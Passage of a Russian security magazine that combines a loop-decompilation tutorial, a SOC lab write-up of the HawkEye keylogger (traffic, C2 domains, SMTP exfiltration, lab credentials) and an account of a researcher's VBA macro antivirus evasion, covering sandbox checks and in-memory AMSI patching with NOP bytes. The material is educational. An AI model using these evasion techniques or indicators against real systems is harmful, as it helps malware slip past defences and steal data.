                jl      short loc_140001078
                inc     ebx

В итоге мы можем деком пилировать цикл следующим образом:


do
{
    if (var_EBX != 2)
        printf("%x\n", var_EBX);
} while (var_EBX++ < 0xA);

А что, выг лядит вполне читабель но, не правда ли? Ничуть не хуже, чем
if (var_EBX == 2) continue.


loc_140001094:                           ; CODE XREF: main+3B↓j
; Начало цикла
                cmp     ebx, 2
; Переход на метку loc_1400010A7, если (var_EBX == 2)
                jz      short loc_1400010A7
                mov     edx, ebx
                lea     rcx, _Format    ; "%x\n"
; printf("%x\n", var_EBX);
; Эта ветка выполняется, лишь когда (var_EBX != 2)
                call    printf
loc_1400010A7:                           ; CODE XREF: main+27↑j
; var_EBX--;
                dec     ebx
                test    ebx, ebx
; Условие продолжения цикла — крутить, пока (var_EBX > 0)
                jg      short loc_140001094

В итоге деком пилирован ный цикл выг лядит примерно так:


    do
    {
        if (var_EBX != 2)
            printf("%x\n", var_EBX);
    } while (--var_EBX > 0)



                xor     eax, eax–
                add     rsp, 20h
                pop     rbx
                retn
main            endp


C++Builder 10 ñ âêëþ÷åííîé îïòèìèçàöèåé
Доволь но интересный образец кода получается у C++Builder 10.4 с включен-
ной оптимизацией по скорости — /O2:


; int __cdecl main(int argc, const char **argv, const char **envp)
                public main
main            proc near                ; DATA XREF:
__acrtused+29↑o
; Ни одной локальной переменной, зато массовое использование
регистров
                push    rbp
                push    rsi
                push    rdi
                sub     rsp, 20h
                lea     rbp, [rsp+20h]
; var_EAX = 1
                mov     eax, 1
; В RSI помещаем указатель на форматную строку
                lea     rsi, unk_44D000
                nop     dword ptr [rax+rax+00000000h]
loc_401420:                              ; CODE XREF: main+2A↓j
main+3C↓j
                                                   ;^^^^^^^^^
^^^^^^^^^
; Начало первого цикла
; var_EDI = var_EAX
                mov     edi, eax        ; Format
                mov     eax, 3
; Сравнение var_EDI и 2
                cmp     edi, 2
; Если (var_EDI == 2), переходим в начало цикла,
; это означает условие с continue
                jz      short loc_401420
; Первый параметр для printf — форматная строка
                mov     rcx, rsi
; Второй параметр для printf — число для вывода
                mov     edx, edi
                call    printf
; Таким хитрым образом C++Builder инкрементирует значение
регистровой переменной
                lea     eax, [rdi+1]
; Сравниваем var_EDI с 0xA,
; В var_EDI хранится значение счетчика до инкремента
                cmp     edi, 0Ah
; Прыгаем в начало цикла, пока (var_EDI < 0xA)
                jl      short loc_401420

На основе имеющихся дан ных можно деком пилировать этот код:


var_EAX = 1;
do
{
    var_EDI = var_EAX;
    var_EAX = 3;
    if (var_EDI == 2) continue;
    printf("%x\n", var_EDI);
}
while (var_EDI++ < 0xA);

Он получился излишне перег ружен ным, оптимизируем:


do
{
    if (var_EDI != 2)
        printf("%x\n", var_EDI);
}
while (var_EDI++ < 0xA);


; Подготовка для второго цикла
                lea     rsi, unk_44D000
                db      66h, 66h, 2Eh
                nop     word ptr [rax+rax+00000000h]
loc_401450:                              ; CODE XREF: main+5A↓j
main+6C↓j
;
^^^^^^^^^^  ^^^^^^^^^
; Начало второго цикла
; После выполнения первого цикла в var_EAX находится максимальное
значение — 0xA
                mov     edi, eax        ; Format
                mov     eax, 1
; Сравниваем var_EDI с 2
                cmp     edi, 2
; Если (var_EDI == 2), переходим в начало (второго) цикла
                jz      short loc_401450
; Подготовка параметров для вызова printf
                mov     rcx, rsi
                mov     edx, edi
                call    printf
; На этот раз декрементируем регистровую переменную
                lea     eax, [rdi-1]
                cmp     edi, 1
; Переходим в начало цикла, пока (var_EDI > 1)
                jg      short loc_401450

На основе имеющихся дан ных этот код можно деком пилировать таким обра-
зом:


var_EAX = 0xA;
do
{
    var_EDI = var_EAX;
    var_EAX = 1;
    if (var_EDI == 2) continue;
    printf("%x\n", var_EDI);
}
while (var_EDI-- > 1);

Оптимизирован ный вариант ты с лег костью построишь без моей помощи.


                xor     eax, eax
                add     rsp, 20h
                pop     rdi
                pop     rsi
                pop     rbp
                retn
main            endp

У C++Builder получился на ред кость стройный код, который приятно читать
и лег ко понимать! Оба цик ла C++Builder преобразовал в цик лы с постусло-
вием, а условие продолжения расположено в середине. Осталь ные ком пилято-
ры генерируют приблизитель но такой же код. Общим для всех слу чаев будет
то, что на цик лах с предусловием оператор continue прак тически неот личим
от вложен ного цик ла, а на цик лах с постусловием continue эквивален тен эле-
мен тарному вет влению.


ÖÈÊËÛ FOR Ñ ÍÅÑÊÎËÜÊÈÌÈ Ñ×ÅÒ×ÈÊÀÌÈ
Настала очередь цик лов for, вращающих несколь ко счет чиков одновремен но.
Рассмот рим следующий пример.


#include <stdio.h>


int main()
{
    for (int a = 1, b = 10; (a < 10 || b > 1); a++, b--)
        printf("%x %x\n", a, b);
}





       Резуль тат выполнения прог раммы for_WithSomeCounters.exe

Как мы пом ним из прош лой статьи, если поставить запятую между условиями,
ком пилятором будет учтено толь ко самое правое из них. Поэтому два и более
условия надо соединять логическими операциями.
  Дизассем блерный листинг этой прог раммы, построенной в Visual C++
2022 с отключен ной оптимизацией, будет иметь следующий вид:


; int __cdecl main(int argc, const char **argv, const char **envp)
main            proc near                ; CODE XREF:
__scrt_common_main_seh+107↓p
                                          ; DATA XREF: .pdata:
0000000140004018↓o
var_b           = dword ptr -18h
var_a           = dword ptr -14h
; Резервируем память для двух локальных переменных
                sub     rsp, 38h
; Инициализируем локальные переменные:
; присваиваем var_a значение 0x1
                mov     [rsp+38h+var_a], 1
; присваиваем var_b значение 0xA
                mov     [rsp+38h+var_b], 0Ah
; Прыжок на код проверки условия выхода из цикла
; Это характерная черта неоптимизированных циклов for
                jmp     short loc_14000110A
; --------------------------------
; Перекрестная ссылка, направленная вниз, говорит о том, что это
начало цикла
; А выше мы уже выяснили, что тип цикла — for
loc_1400010F6:                           ; CODE XREF: main+4D↓j
; var_a++;
                mov     eax, [rsp+38h+var_a]
                inc     eax
                mov     [rsp+38h+var_a], eax
; var_b--;
                mov     eax, [rsp+38h+var_b]
                dec     eax
                mov     [rsp+38h+var_b], eax
loc_14000110A:                           ; CODE XREF: main+14↑j
                cmp     [rsp+38h+var_a], 0Ah
; Если (var_a < 0xA), прыгаем в секцию продолжения цикла и вывода
строки
                jl      short loc_140001118
                cmp     [rsp+38h+var_b], 1
; Выход из цикла, если (var_b <= 0x1)
                jle     short loc_14000112F
loc_140001118:                           ; CODE XREF: main+2F↑j
; Готовим параметры для вызова printf
                mov     r8d, [rsp+38h+var_b]
                mov     edx, [rsp+38h+var_a]
                lea     rcx, _Format    ; "%x %x\n"
; Сам вызов printf:
; printf("%x %x\n", var_a, var_b);
                call    printf
; Безусловный переход в начало цикла
                jmp     short loc_1400010F6
; --------------------------------
loc_14000112F:                           ; CODE XREF: main+36↑j
                xor     eax, eax
                add     rsp, 38h
                retn
main            endp

Как и полагается, ком пилятор учел оба условия. Так как между ними стоит OR,
если первое выполняет ся, второе проверять не имеет смысла, и прог рамма
перепрыгивает на стадию вывода строки. Если же первое условие не срабаты-
вает, то прог рамма обрабаты вает второе условие.
  Оно было инвертировано ком пилятором на противоположное по сравнению
с исходным. Поэтому в слу чае его выполнения происходит выход из цик ла
и переход в завершающую сек цию. После этого выполнение прог раммы
самотеком переходит к под готовке парамет ров и выводу строки. После чего
посредством безусловного перехода осу щест вляется пры жок в начало цик ла.
   Этот цикл можно пред ставить как:


while(1)
{
    var_a++;
    var_b--;
    if (var_a < 0xA || var_b > 0x1)
        printf("%x %x\n", var_a, var_b);
}

Но по соображениям удобочитаемости имеет смысл ском поновать этот код
в цикл for:


for (var_a = 1, var_b = 0xA; (a < 10 || b > 1); var_a++, var_b--)
    printf("%x %x\n",var_a,var_b);

Ком пилятор без оптимизации вставляет безусловный переход на код проверки
выхода из цик ла. А как поведет себя этот же ком пилятор с включен ной опти-
мизацией?


; int __cdecl main(int argc, const char **argv, const char **envp)
main            proc near                ; CODE XREF:
__scrt_common_main_seh+107↓p
                                          ; DATA XREF: .pdata:
000000014000400C↓o
; Один аргумент
arg_0            = qword ptr  8
                mov     [rsp+arg_0], rbx
                push    rdi
; Резервируем для него место в стеке
                sub     rsp, 20h
; Регистровые переменные:
; var_EDI = 0x1
                mov     edi, 1
; var_EBX = 0xA
                lea     ebx, [rdi+9]
loc_140001082:                           ; CODE XREF: main+31↓j
                cmp     edi, 0Ah
; Если (var_EDI < 0xA), переход на метку loc_14000108C, где
происходит вывод строки
; и манипуляции со счетчиками
                jl      short loc_14000108C
                cmp     ebx, 1
; Если (var_EBX <= 1), идем на выход
                jle     short loc_1400010A3
loc_14000108C:                           ; CODE XREF: main+15↑j
; Готовим параметры, выводим строку
                mov     r8d, ebx
                lea     rcx, _Format    ; "%x %x\n"
                mov     edx, edi
                call    printf
; Манипуляции со счетчиками:
; var_EDI++;
                inc     edi
; var_EBX--;
                dec     ebx
; Осуществляем безусловный переход в начало цикла
                jmp     short loc_140001082
; --------------------------------
loc_1400010A3:                           ; CODE XREF: main+1A↑j
                mov     rbx, [rsp+28h+arg_0]
                xor     eax, eax
                add     rsp, 20h
                pop     rdi
                retn
main            endp

Оптимизирован ный код выг лядит гораздо понят нее и яснее!
  Осталь ные ком пиляторы, в том числе Visual C++, обрабаты вают выражения
инициализации и модификации счет чиков коррек тно в поряд ке их объявления
в тек сте прог раммы.


ÇÀÊËÞ×ÅÍÈÅ
Цик лы, подобно условным операторам, откры вают перед ком пиляторами
широкий простор для творчества. В простых слу чаях одни ком пиляторы пред-
сказывают каждый шаг выполнения цик лов и полностью отказываются от них,
дру гие — строят заковы ристые трассы, которые порой тормозят кон вейер
исполнения процессора. Самые лучшие на деле выправляют код прог раммис-
та, предоставляя процессору оптималь ный маршрут.
  На этом можно поставить точку в наших изысканиях с цик лами. Мы разгрыз-
ли все имеющиеся типы цик лов язы ков C/C++ и Pascal/Delphi. Увидели, как их
тран слируют современ ные версии ком пиляторов этих язы ков прог раммирова-
ния с включен ной автоматической оптимизацией и без нее. Автоматическая
оптимизация творит с кодом чудеса! Она умень шает количество условий
и переходов, ускоряя прог рамму. Иног да после ее исполь зования дизассем-
блерный код становит ся более понятен, чем до нее.
  В работе хакера иден тификация цик лов играет важную роль, потому что,
пропустив или неправиль но поняв одну мет ку, можно испортить весь пред-
варитель ный анализ, даже не поняв, что пропустил цикл! После этого придет ся
начинать тру доем кий анализ всей прог раммы с самого начала.
ВЗЛОМ





    РАССЛЕДУЕМ
   КИБЕРИНЦИДЕНТ
     HAWKEYE





Сегод ня мы с тобой поп ракти куем ся в рас-
следова нии инци ден тов и решим лабора-
тор ную  работу  HawkEye  с  ресур са
CyberDefenders .   Научим ся   раз бирать
сетевой  тра фик,  извлекать  артефак ты            rayhunt454                                                                                   grigadan454@gmail.com
и восста новим кар тину взло ма информа-
цион ного ресур са.


Сог ласно сценарию бухгалтер организации получил элек трон ное пись мо,
содержащее ссылку для скачивания счета. Вскоре после откры тия пись ма был
обнаружен подозритель ный сетевой трафик. Наша задача в качестве аналитика
SOC изу чить этот трафик, выявить вредоносный файл и обнаружить попыт ки
эксфиль трации дан ных.
  По резуль татам решения кейса необходимо ответить на ряд вопросов, но я
покажу сам процесс решения, а не ответы на них. Ты можешь сам повторить
работу и пройти опрос для зак репления знаний.
  Первым делом скачаем файл архива с сетевым трафиком и приступим к его
исследованию.


ÈÍÑÒÐÓÌÅÍÒÀÐÈÉ
 1. Wireshark — анализатор сетевых протоколов.
 2. NetworkMiner — инстру мент сетевого криминалистического анализа.
   Упрощает анализ трафика, обнаруживает операционные системы хостов, их
   сетевые имена и так далее.
 3. Exe2Aut — деком пилятор ском пилирован ных скриптов AutoIt3.
 4. ResourceHacker — редак тор ресурсов исполняемых файлов.
 5. DIE — прог рамма для определения типов файлов.


ÀÍÀËÈÇ ÑÅÒÅÂÎÃÎ ÒÐÀÔÈÊÀ
После распаковки архива с заданием мы получим файл сетевого трафика
с расширением .pcap. Откроем его в Wireshark и увидим статистическую
информацию о файле захвата. Для этого переходи на вклад ку «Статистика →
Свойства файла Захвата».





                      Статистика файла захвата

Время захвата первого пакета — 2019-04-10 20:37:07 UTC, время захвата
последнего пакета — 2019-04-11 00:40:48, общее время записи сетевого
трафика — 01:03:41. Количество пакетов в файле захвата — 4003.
  Получим статистику о конечных точках, которые присутству ют в сетевом
трафике. Заходим на вклад ку «Статистика → Конечные точки».





          Список конечных точек на уровне протокола Ethernet





               Список конечные точек на уровне IPv4

Ак тивный компь ютер имеет MAC-адрес 00:08:02:1c:47:ae и IP-адрес 10.4.
10.132. В файле захвата участву ет три компь ютера организации с маской 24.
  Определим производителя сетевой карты по MAC-адресу, для этого вос-
поль зуем ся сервисом networkcenter.info. Производитель сетевой карты —
Hewlett Packard.
  Далее заг рузим файл в утилиту NetworkMiner и получим информацию
о хосте бухгалтера. Вводим IP 10.4.10.132 и имя компь ютера BEIJING-5CD1-
PC.





             Ин формация о ском прометирован ном хосте

Посколь ку по сценарию бухгалтер перешел по ссылке и заг рузил исполняемый
файл, отфиль тру ем сетевой трафик по протоколу DNS и найдем все запросы
доменов.





              Ин формация о запрашиваемых доменах

В пакете 204 обнаружен запрос к DNS-серверу организации с IP-адресом 10.
4.10.4. Получен адрес домен ного имени proforma-invoices.com. Проверя-
ем этот домен на VirusTotal и обнаруживаем, что пять антивиру сов считают его
вредоносным. Получается, что ком прометация сети произош ла в 20:37:53
10.04.2019.
  В 206-м пакете DNS-сервер разыменовал домен ное имя и получил IP-
адрес вредоносного домена 217.182.138.150, Фран ция.
  Смот рим даль нейшие взаимодействия с доменом proforma-invoices.
com. Начиная с 207-го пакета осу щест влен HTTP-запрос.





                  Взаимодействие по протоколу HTTP

Жмем правой кнопкой мыши на 207-й пакет и переходим во вклад ку «Сле-
довать → Поток TCP». Получаем собранную сессию.





                         Сессия HTTP

Поль зователь  перешел   по   ссылке   http://proforma-invoices.com/
proforma/tkraw_Protected99.exe   и    заг рузил   исполняемый   файл
tkraw_Protected99.exe. Извлечем этот файл и проведем неболь шое иссле-
дование. Для этого нажмем на вклад ку «Файл → Экспортировать объекты →
HTTP». Как вид но из заголовка выше, в поле User-Agent указана операци-
онная система ском прометирован ной машины — Windows NT 6.1. На вре-
доносном сервере запущен веб-сервер LiteSpeed.





                 Извлечение исполняемого файла

Получим первичную информацию о файле. Его MD5-сум ма:


71826ba081e303866ce2a2534491a2f7

Заг рузим его в утилиту DIE.





               Ин формацию об исполняемом файле

Файл tkraw_Protected99.exe написан на C/C++ и содержит в себе скрипт
AutoIt . Собран для 32-бит ных систем.
   Заг рузим сум му MD5 на VirusTotal и найдем информацию о вредоносном
файле.





                   Ин формация о вредоносе

Ан тивирусное    средство    Malwarebytes    классифицирует    вредонос
как Spyware.HawkEyeKeyLogger.
  Восполь зуем ся утилитой ResourceHacker и найдем в ресурсах скрипт
AutoIt.





                  Содержимое ресурса RCData

Закиды ваем файл в утилиту Exe2Auth и деком пилиру ем вредоносный скрипт.




                     Процесс декомпиляции 64-разрядный исполня-
                     емого фай ла со скриптом AutoIt опи сан в блоге
                       Hexacorn.


Так узнаем, что перед нами скрипт, ском пилирован ный при помощи AutoIt 3,
который исполь зует ся как заг рузчик основного модуля. Код силь но обфусци-
рован.





                              Участок кода

После  преобразования  строк  кода  вид но,  что  происходит  изменение
шелл-кода. Новый код поступает в фун кцию RunPE, которая внед ряет его
в исполняемый файл RegAsm.exe. Основная задача вредоноса — это сбор
дан ных о системе и кража аутен тификацион ной информации из браузеров.
  Продолжаем анализировать сетевой трафик. Начиная с пакета 3159 уста-
навливается HTTP-соединение с сервером bot.whatismyipaddress.com IP-
адрес — 66.171.248.178.




              Соединение с управляющим сервером

Таким образом вредонос узнает внеш ний IP-адрес атакуемой организации.





               Получение белого адреса организации

Публичный адрес ском прометирован ной сети организации — 173.66.146.112,
расположен в США.
  После сбора информации о системе начинается процесс эксфиль трации
дан ных на C&C. Для этого злоумыш ленники отправляли дан ные на почтовый
сервер.
  В сетевом трафике этот процесс начинается с пакета 3171. После разыме-
нования домен ного имени управляющего сервера macwinlogistics.in (IP-
адрес 23.229.162.69) устанавливается сессия SMTP.





            Сетевое взаимодействие по протоколу SMTP

Чтобы посмотреть сессию, нажмем «Следовать → Поток TCP».





                     Эк сфиль трация дан ных

Вредонос прошел процесс аутен тификации на почтовом сервере Exim 4.91,
логин sales.del@macwinlogistics.in, пароль Sales@23. Пробиваем домен
при помощи Whois.





              Ин формация о домене macwinlogistics.in

Дата регистрации домена — 2014-02-08.
  Выг рузим сообщения и разберем, какую информацию получил злоумыш-
ленник. Переходим на вклад ку «Файл → Экспортировать объекты → IMF» и сох-
раняем все обнаружен ные сообщения .eml. Преобразуем все строки заголовка
и содержимого сообщения из Base64.





                Содержимое заголовка сообщения

Как вид но из заголовка, в поле Subject содержится информация о модуле
Reborn v9, который извлек дан ные и имя поль зователя ском прометирован ного
компь ютера, а так же публичный адрес организации.
  В теле сообщения содержатся извлечен ные из браузеров дан ные.





                           Ук раден ные дан ные

Злоумыш леннику  удалось  украсть  аутен тификацион ные  дан ные  roman.
mcguire:P@ssw0rd$ от аккаунта Bank of America.
  Вредоносу удалось отправить несколь ко таких сообщений. Отфиль тру ем
сетевой трафик по протоколу SMTP и найдем коман ду EHLO. Строка филь тра:
smtp.req.command == "EHLO".





                Количество отправленных сообщений

Видим, что вредонос отправил шесть сообщений с интервалом в 10 минут.


ÂÛÂÎÄÛ
Мы проанализировали трафик и восстановили ход инциден та. Вот, что мы узна-
ли:
 • В 20:37:53 10.04.2019 бухгалтер перешел по ссылке на вредоносный
   исполняемый файл.
 • Затем запустил исполняемый файл tkraw_Protected99.exe.
 • Основная фун кция вредоноса — кража кон фиден циаль ной информации.
 • Собранные дан ные передавались злоумыш леннику по элек трон ной почте
   на сервер macwinlogistics.in.
 • Для под ключения  к  почтовому серверу  исполь зованы  логин sales.
  del@macwinlogistics.in и пароль Sales@23.
 • В сообщении передавались логин и пароль для доступа к Bank of America
   и учет ные дан ные почтового сервера организации.

На этом расследование можно считать завершенным.
ВЗЛОМ





ОБХОДИМ ДЕТЕКТ
ÂÐÅÄÎÍÎÑÍÛÕ
ÌÀÊÐÎÑÎÂ WORD





Ка залось бы, мак ровиру сы дав но и без воз врат но ушли
в прош лое. Уж что-что, а вредоносные мак росы в докумен-
тах Oﬃce сов ремен ные анти вирусные прог раммы дол жны
обна ружи вать лег ко и неп ринужденно. Имен но так и обсто-
ят  дела,  если  мак рос,  конеч но,  не  обфусци рован.
Эффектив ными при ема ми обхо да анти вирусного детек та
злов редных VBA-мак росов поделил ся в сво ей публикации
незави симый исследова тель Брен дан Ортиз, а мы расска-
жем о его изыскани ях тебе.


Готовясь к сертификации OSEP, Брен дан Ортиз наверняка выпил вед ро кофе
и перелопатил гигабайты технической докумен тации. Насчет кофе мы не уве-
рены, а вот то, что резуль татом этой под готовки стало масштабное и под-
робное исследование способов зак ладки VBA-мак росов в самые обычные
докумен ты Word, не под лежит никакому сом нению. Брен дан убедился, что
на сайте antiscan.me (аль тернатива virustotal.com) оригиналь ный файл обна-
руживался как минимум 7 антивирусными движками из 20. Тог да он всерь ез
взялся за обфускацию своих художеств и смог в итоге сбить показатель детек-
тирования до 2 из 20. Посколь ку антивирусные базы периодически обновля-
ются, со временем этот параметр вырос с 2 до 5. Но все равно — резуль тат
получился впечат ляющий.




                     Вся  информа ция  в  этой  статье  при водит ся
                      исключительно в озна коми тельных целях, автор
                      и редакция не несут никакой ответс твенности
                        за пос ледс твия использования этой пуб ликации.
                     Предупрежда ем, что при выпол нении макросов
                        в документах  Microsoft  на  твоем  устрой стве
                        могут быть спровоци рова ны нежела тельные дей-
                         ствия.



ÏÐÎÂÅÐÊÀ ÝÌÓËßÖÈÈ

Многие антивиру сы, исполь зующие для детек тирования вредоносов эвристи-
ку, запускают VBA-скрипты в «песочнице» с целью убедить ся в их безопас-
ности. Поэтому настоящие вирусописатели в первую очередь проверяют,
работает ли их сценарий в эму лирован ной среде, и, если так, останавливают
выполнение вредоносного пейлоада, чтобы антивирус не забил тревогу.
   Брен дан Ортиз пред ложил три простых теста для определения эму лятора.
Эти тесты располагаются в самом начале созданного им мак роса и не поз-
воляют ему выполнить никаких зловредных действий, если обнаружит ся, что
скрипт запущен в изолирован ной среде.





                        Первая проверка

Первый тест исследователь назвал Document Name. Во многих слу чаях, ког да
антивирусный движок эму лиру ет выполнение мак роса VBA, он меняет имя
докумен та либо добавляет к этому имени некоторое число, чтобы отследить
и предот вратить многок ратный запуск скрипта. Этот тест проверяет, совпадает
ли с именем оригиналь ного докумен та имя того докумен та, в котором выпол-
няет ся полезная наг рузка.
   Чтобы зашифровать статическую строку, в которой хранит ся имя докумен та,
исполь зует ся сценарий PowerShell, а затем во время выполнения скрипта
для ее расшифровки вызывается собствен ная фун кция Joy. Если имя активно-
го докумен та не совпадает с указан ным именем, проверка считает ся не прой-
ден ной и выполняет ся выход из под прог раммы.
  На втором этапе проверяется путь. Если мы заранее знаем, из какой папки
будет открыт документ с вредоносным сценарием (например, из папки «Заг-
рузки» поль зователя Windows), то мы можем сравнить ее с текущим путем.
Несовпадение пути укажет на то, что скрипт, скорее всего, работает в анти-
вирусном движке. В этом слу чае мы так же выходим из под прог раммы.
  Наконец, простой тест на время. Ког да скрипт выполняет ся в эму ляторе
антивиру са, тот обычно пропускает фраг менты кода, в которых реализована
пауза или «засыпание», иначе любящие «поспать» мак ровиру сы попросту
завесят движок. Поэтому Брен дан пред ложил следующую нехит рую проверку:
фик сиру ем акту аль ное время, «спим» две секун ды, а затем просыпаемся
и вновь фик сиру ем время. Если разница между дву мя этими значениями сос-
тавит мень ше двух секунд, скорее всего, мы в антивирусном движке. В этом
слу чае под прог рамма так же завершает ся.
   Если все три проверки завершились полным и безоговорочным успехом,
мак рос переходит к выполнению полезной наг рузки, которая выг лядит при-
мерно так, как показано на следующем рисун ке.





                      Полезная наг рузка


ÍÅÑÊÎËÜÊÎ ÑËÎÂ ÎÁ AMSI

В ходе своих эксперимен тов Брен дан Ортиз выяснил, что поначалу его вре-
доносный мак рос успешно детек тировался эвристикой боль шинства анти-
вирусных движков. Кроме того, несмотря на многочисленные попыт ки иссле-
дователя запустить мак рос при включен ной защите Windows Defender, система
убивала скрипт. По какой же причине мак рос помечался как вредоносный? Все
дело в том, что интерфейс Anti-Malware Scan Interface (AMSI) заг лядывает
в сценарий VBA и кон тролиру ет его поведение.





                       Прин цип работы AMSI

AMSI — это разработан ный  Microsoft интерфейс, который приспособлен
к работе с любыми антивиру сами и позволяет им запрашивать информацию
о процессах, происходящих во время исполнения прог рамм. Это значит, что
антивиру су  передаются  даже  бесфайловые  угрозы,  например  коман ды
PowerShell, если антивирус вызывает AMSI. Еще это означает, что ты можешь
как угод но обфусцировать полезную наг рузку, но, как толь ко она деобфусци-
рует ся во время выполнения, AMSI начнет отслеживать поведение кода.
   Ког да поль зователь пытается выполнить коман ду в PowerShell, AMSI сна-
чала  заг ружает, а затем проверяет  эту коман ду. Если обнаруживают ся
какие-либо элемен ты, которые обычно исполь зуют ся для вредоносных дей-
ствий, в частности вызовы API Win32 или COM (то есть срабаты вают заложен-
ные в AMSI «триг геры»), то AMSI приостанавливает подозритель ный процесс.
  На картинке ниже показано, как VBA интегрирует ся с AMSI. С учетом всего
этого исследователь стал искать способы усколь знуть от присталь ного вни-
мания AMSI при выполнении скриптов VBA и PowerShell.





                Ин теграция AMSI с JavaScript/VBA


ÈÌÏÎÐÒ WINDOWS API Â VBA

Начать Брен дан решил с импорта фун кций. Чтобы пропат чить AMSI в памяти,
необходим доступ к некоторым низкоуровневым библиотекам и фун кциям
Windows. В VBA разрешено импортировать API Windows для исполь зования
в мак росе. Такая возможность радикаль но расширяет фун кциональ ность VBA.
  Злоумыш ленник,  вызывая  определен ные  API  Windows  из  VBA,  C#,
PowerShell и т. д., должен хорошень ко в них разобрать ся, чтобы все сделать
правиль но. Дело в том, что нативные фун кции для этих целей в соот ветству-
ющих язы ках отсутству ют. Но, воору жившись некоторыми «под готовитель ными
знаниями», заполнить эти пробелы доволь но лег ко. Ког да ты знаешь, какие API
Windows хочешь импортировать, для начала обязатель но погуг ли соот ветству-
ющую докумен тацию Microsoft. Там ты найдешь под робную информацию
об интересу ющей тебя фун кции, в частности каковы ее возвращаемые зна-
чения, какие парамет ры она принимает, в какой DLL находит ся интересу ющий
тебя API. Так ты получишь по-настоящему хорошее пред ставление о событиях,
происходящих «под капотом» скрипта.
   Брен дан исполь зовал в своем мак росе объявление PInvoke (Platform-Invoke,
«Плат формен ный вызов»). PInvoke — это коллекция определений для вызова
нативных фун кций API Windows из язы ков прог раммирования, в которых может
отсутствовать такая низкоуровневая фун кциональ ность. Особен ности работы
этого инстру мен та под робно описаны вот на этом сайте. Там можно найти дек-
ларации для импорта API в различные сценарии на все слу чаи жизни.


ÎÁÕÎÄ AMSI

Им порт необходимых API Windows в VBA — это толь ко первый шаг. Чтобы при-
думан ный Брен даном Ортизом скрипт работал, нужно обойти AMSI. Для этого
исследователь решил пропат чить AMSI прямо в памяти. А кон крет нее — про-
пат чить   первые   несколь ко   байтов   в   фун кциях   AmsiScanBuffer
и AmsiScanString из библиотеки Amsi.dll, заг ружаемой из запущен ного про-
цесса. Эти фун кции, если верить докумен тации Microsoft, отвечают за сканиро-
вание содержимого буфера в поисках харак терных для малвари строк.





                              Патч AMSI

Сначала объявляется список указателей перемен ных для хранения адресов
фун кций. Затем в перемен ной lib сохраняется адрес из библиотеки amsi.
dll, это делается при помощи направляемого к API Windows вызова LoadLib.
Все строки в этом пат че памяти AMSI должны быть обфусцированы. На первом
этапе автор скрипта исполь зовал для этого фун кцию VBA Chr(), чтобы скрыть
некоторые харак терные строки вроде amsi.dLl и AmsiUacInitialize.
  Затем нужно найти, где лежит фун кция AmsiScanString. Для этого Брен-
дан исполь зовал фун кцию Windows API GetProcAddress, переименован ную
в GetPrAddr. Посколь ку AMSI еще не пропат чен, а вредоносы часто пытаются
отключить его, нацеливаясь на фун кции AmsiScanString и AmsiScanBuffer,
автор скрипта восполь зовался относитель ной адресацией, начиная с фун кции
AmsiUacInitialize.
   Для начала Брен дан вычел 96 из адреса фун кции AmsiUacInitialize
и сохранил резуль тат в перемен ной func_addr. Затем вызвал GetPrAddr
со строками-аргу мен тами, первая из которых — это адрес amsi.dll, а вто-
рая — строка AmsiUacInitialize, к которой применена обфускация. Зачем
вычитать 96? Все очень просто: Брен дан прошелся по процессу Microsoft Word
отладчиком WinDbg и выяснил, что адрес фун кции AmsiScanString отстоит
на 96 байтов от фун кции AmsiUacInitialize.
   Если просмотреть в WinDbg содержимое заг ружен ной в память библиотеки
AMSI.dll, начиная с фун кции AmsiScanBuffer, расположен ной по адресу
0x100 в шестнад цатеричной системе (256 байт в десятичной), то можно уви-
деть, как выг лядит верхняя часть вывода.





             Содержимое памяти библиотеки AMSI.dll

Стрелка указывает на первые опкоды в фун кции AmsiScanBuffer, а слева
показан   ассоциирован ный   с   этой  инструк цией  адрес   в   памяти:
0x00007ffa054f35e0. Следователь но, фун кция AmsiScanBuffer начинается
имен но в этой точке. Изу чив вывод далее, можно найти следующую фун-
кцию — AmsiScanString — и выяснить ее адрес: 0x00007ffa054f36e0.





                   Ад рес фун кции AmsiScanString

Далее Брен дан отыскал в выводе отладчика значение перемен ной func_addr,
которую заг рузил в свой мак рос VBA при помощи фун кции GetPrAddr. В этой
перемен ной     находит ся     адрес    фун кции    AmsiUacInitialize:
0x00007ffa054f3740.





               Поиск адреса фун кции AmsiUacInitialize

Все, что осталось сделать автору скрипта, — это просто вычесть из адреса
фун кции    AmsiUacInitialize    адреса    фун кций    AmsiScanString
и AmsiScanBuffer. Так будут получены относитель ные адреса последних.


0x054f3740 (AmsiUacInitialize Start Address) - 0x054f36e0 (
AmsiScanString Start Address) = 0x60 = 96 bytes
0x054f3740 (AmsiUacInitialize Start Address) - 0x54f35e0 (
AmsiScanBuffer Start Address) = 0x160 = 352 bytes

Следующая часть созданного Брен даном Ортизом мак роса меняет защит ные
механизмы памяти и порядок доступа к ней целевых фун кций. Это делается
при помощи API-фун кции VirtualProtect, которую автор переименовал
в VirtPro.





               Исполь зование фун кции VirtualProtect

Фун кция VirtualProtect меняет харак теристики защиты в области виртуаль-
ной памяти, которая относит ся к адресному пространству вызывающего про-
цесса. С ее помощью можно изменить показатели защиты для кон крет ного
участка памяти (с атрибутами «толь ко для чтения» или «для исполнения»),
в резуль тате чего появляет ся возможность редак тировать расположен ные там
инструк ции.
   VirtualProtect принимает следующие парамет ры: адрес того места,
которое нужно отредак тировать (это адрес интересу ющей нас фун кции), раз-
мер области памяти, которую требует ся редак тировать (32 байта от начала
адреса), уровни защиты памяти, которые требует ся обеспечить (передается
в виде значения, которое будет обрабаты вать ся при помощи побитовой опе-
рации AND). Наконец, в сценарии содержится перемен ная flOldProtection.
Фун кция сохраняет в эту перемен ную старое значение парамет ров защиты
памяти — для последу ющего исполь зования.
  Получив доступ к чтению и записи тех областей памяти, что пред назначены
толь ко для записи, Брен дан перешел непосредствен но к пропат чиванию AMSI.
Для этого он исполь зовал WinAPI-фун кцию RtlFillMemory. Такие фун кции,
как RtlMoveMemory, часто исполь зуют ся вредоносами, поэтому лег ко обна-
руживают ся эвристикой антивиру сов. А вот RtlFillMemory — не самый час-
тотный вариант, из-за чего ее могут и не сэмулировать движки, работа которых
основана на эвристике. Да и при статическом анализе антивиру сы далеко
не всег да обращают на нее внимание. Брен дан переименовал эту фун кцию
в patcher.



               Исполь зование фун кции RtlFillMemory

В  скрипте выполняет ся  вызов фун кции  RtlFillMemory по  псевдониму
patcher, ей передаются адреса фун кций AmsiScanString и AmsiScanBuffer.
Затем нужно указать,  сколь ко байтов требует ся заполнить,  и,  наконец,
передать шестнад цатеричное значение кода операции, которое требует ся туда
добавить: 0x90 — это код NOP, он ничего не делает. Затем выполняет ся то же
